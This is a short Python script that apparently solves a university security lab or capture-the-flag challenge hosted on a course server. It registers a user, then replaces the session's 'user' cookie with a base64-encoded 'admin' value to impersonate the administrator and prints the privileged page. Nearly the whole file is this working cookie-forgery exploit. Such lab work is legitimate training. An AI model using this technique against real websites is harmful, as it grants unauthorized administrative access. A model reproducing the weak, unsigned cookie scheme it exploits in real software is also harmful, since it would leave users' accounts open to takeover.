import requests
import base64

SERVER = "http://mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 25056 

link = f"{SERVER}:{PORT}"

# Create a session to persist the cookies between requests
s = requests.Session()

# Access the first link to set the user cookie
s.get(link)

response = s.get(f"{link}")

payload = {"username" : "ramdom"}

response = s.post(f"{link}", data = payload)

admin = base64.b64encode(b"admin").decode()

s.cookies.set("user", admin)

response = s.get(f"{link}")

print(response.text)
